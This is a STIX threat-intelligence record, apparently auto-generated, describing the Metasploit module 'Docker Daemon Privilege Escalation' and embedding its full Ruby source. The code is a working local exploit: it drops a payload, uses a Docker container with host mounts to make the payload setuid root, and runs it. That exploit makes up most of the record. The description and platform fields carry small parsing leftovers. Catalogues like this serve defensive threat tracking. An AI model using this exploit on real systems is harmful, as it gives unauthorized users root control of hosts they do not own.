{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--870ca114-1e52-4c00-a4a8-939e334df2da",
    "created": "2024-08-14T16:59:31.864149Z",
    "modified": "2024-08-14T16:59:31.864153Z",
    "name": "Docker Daemon Privilege Escalation",
    "description": " This module obtains root privileges from any host account with access to the Docker daemon. Usually this includes accounts in the `docker` group.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/docker_daemon_privilege_escalation.rb",
            "external_id": "docker_daemon_privilege_escalation.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'           => 'Docker Daemon Privilege Escalation',\n      'Description'    => %q{\n        This module obtains root privileges from any host account with access to the\n        Docker daemon. Usually this includes accounts in the `docker` group.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => ['forzoni'],\n      'DisclosureDate' => '2016-06-28',\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],\n      'Targets'        => [ ['Automatic', {}] ],\n      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 60 },\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultTarget'  => 0\n      }\n    ))\n    register_advanced_options([\n      OptString.new(\"WritableDir\", [true, \"A directory where we can write files\", \"/tmp\"])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    if cmd_exec('docker ps && echo true') =~ /true$/\n      print_good(\"Docker daemon is accessible.\")\n      Exploit::CheckCode::Vulnerable\n    else\n      print_error(\"Failed to access Docker daemon.\")\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    if nosuid? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is mounted nosuid\"\n    end\n\n    pl = generate_payload_exe\n    exe_path = \"#{base_dir}/#{rand_text_alpha(6..11)}\"\n    print_status(\"Writing payload executable to '#{exe_path}'\")\n\n    write_file(exe_path, pl)\n    register_file_for_cleanup(exe_path)\n\n    print_status(\"Executing script to create and run docker container\")\n    vprint_status cmd_exec(\"chmod +x #{exe_path}\")\n    vprint_status shell_script(exe_path)\n    vprint_status cmd_exec(\"sh -c '#{shell_script(exe_path)}'\")\n\n    print_status \"Waiting #{datastore['WfsDelay']}s for payload\"\n  end\n\n  def shell_script(exploit_path)\n    deps = %w(/bin /lib /lib64 /etc /usr /opt) + [base_dir]\n    dep_options = deps.uniq.map { |dep| \"-v #{dep}:#{dep}\" }.join(\" \")\n\n    %Q{\n      IMG=`(echo \"FROM scratch\"; echo \"CMD a\") | docker build -q - | awk \"END { print \\\\\\\\$NF }\"`\n      EXPLOIT=\"chown 0:0 #{exploit_path}; chmod u+s #{exploit_path}; chmod +x #{exploit_path}\"\n      docker run #{dep_options} $IMG /bin/sh -c \"$EXPLOIT\"\n      docker rmi -f $IMG\n      #{exploit_path}\n    }.strip.split(\"\\n\").map(&:strip).join(';')\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}